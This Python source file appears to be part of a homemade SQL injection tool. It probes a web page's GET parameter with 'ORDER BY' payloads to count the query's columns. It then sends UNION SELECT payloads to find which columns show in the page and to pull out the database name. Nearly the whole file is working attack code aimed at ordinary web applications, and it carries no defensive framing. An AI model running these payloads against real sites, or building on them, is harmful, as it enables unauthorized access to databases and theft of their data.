
import requests
from utils.ainsi import *
from objects.vuln_link import *
from urllib.parse import urlparse
import re
from bs4 import BeautifulSoup

class Get_Injector:
    def __init__(self, vuln_link):
        self.identified_db, self.link, self.query_params, self.success = vuln_link.get_infos()
        print(self.link)
        response = requests.get(self.link)
        
        if response:
            response.encoding = "utf-8"
            self.first_page = response.text
            parsed_url = urlparse(self.link)
            self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            # print(response.text)
            
            self.get_union_based_injection()
            
            
                
        else:
            print(f"{colored('❌ Error:  ', RED,styles=BOLD)} {colored('no response to get the url', RED, styles=BOLD)}\n")
    
    def generate_union_select_payload(self, number):
        payloads = [
                    "' UNION SELECT 'MARKER_A'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I', 'MARKER_J'-- -"
                ]
        return payloads[number - 1]
    
    def generate_chars_to_find(self, number):
        base = "ABCDEFGHIJ"
        chars = set()
        if (number > len(base)):
            return chars
        for i in range(0, number):
            chars.add("MARKER_" + base[i])
        chars = sorted(chars)
        return chars        
    
    def get_union_based_injection(self):
        columns = 0
        #! SEARCH FOR NUM OF COLUMNS
        for i in range(0, 10):
            payload = f"' ORDER BY {i}-- -"
            
            params = self.query_params.copy() if isinstance(self.query_params, dict) else {}
            
            param_name = list(params.keys())[0] if params else self.query_params
            params[param_name] = payload
            
            response = requests.get(self.base_url, params=params)
            if "Unknown column" in response.text and i != 0:
                columns = i - 1
                break
        
        print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
        if columns < 2:
            return None
        
        #! INJECTING PARAMETERS TO FIND CATEGORY
        payload = self.generate_union_select_payload(columns)
        
        params = self.query_params.copy() if isinstance(self.query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else self.query_params
        params[param_name] = payload
        
        response = requests.get(self.base_url, params=params)
        print(f"{colored(response.url, RED)}")
        
        chars_to_find = self.generate_chars_to_find(columns)
        for char in chars_to_find:
            if char in response.text:
                print(char)
                
        
        
        soup = BeautifulSoup(response.text, 'html.parser')
        pretty_text = soup.prettify()
        print(f"{colored(pretty_text, GREEN)}")
        print(f"Extracted values: {chars_to_find}")
        # print(response.url)
        
        
        payload = "' UNION SELECT CONCAT('DB_START:',DATABASE(),':DB_END'), NULL, NULL -- -"
        params = self.query_params.copy() if isinstance(self.query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else self.query_params
        params[param_name] = payload
        response = requests.get(self.base_url, params=params)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        pretty_text = soup.prettify()
        print(f"{colored(pretty_text, YELLOW, styles=BOLD)}")
        print(f"{colored(response.url, RED, styles=BOLD)}")
        
        
        
        
    
